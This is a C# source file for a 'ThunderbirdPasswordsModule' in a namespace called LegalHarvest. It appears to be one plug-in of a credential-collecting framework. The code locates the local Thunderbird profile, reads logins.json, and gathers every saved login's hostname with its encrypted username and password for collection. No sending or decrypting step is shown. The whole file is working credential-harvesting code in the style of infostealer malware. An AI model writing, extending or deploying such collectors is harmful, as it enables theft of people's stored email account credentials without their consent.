using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.IO;

namespace LegalHarvest.Modules
{
    public class ThunderbirdPasswordsModule : ICollectorModule
    {
        public string ModuleName => "ThunderbirdPasswords";
        public bool CanExecute()
        {
            string profileDir = GetProfileDirectory();
            return profileDir != null && File.Exists(Path.Combine(profileDir, "logins.json"));
        }

        private string GetProfileDirectory()
        {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string tbDir = Path.Combine(appData, "Thunderbird", "Profiles");
            if (!Directory.Exists(tbDir)) return null;
            foreach (string dir in Directory.GetDirectories(tbDir))
                if (File.Exists(Path.Combine(dir, "logins.json"))) return dir;
            return null;
        }

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string profileDir = GetProfileDirectory();
            if (profileDir == null) return items;

            JObject json = JObject.Parse(File.ReadAllText(Path.Combine(profileDir, "logins.json")));
            foreach (var login in json["logins"])
            {
                items.Add(new CollectedItem
                {
                    Category = "Thunderbird",
                    Name = login["hostname"].ToString(),
                    Value = $"User={login["encryptedUsername"]};Pass={login["encryptedPassword"]}",
                    Timestamp = DateTime.Now
                });
            }
            return items;
        }
    }
}
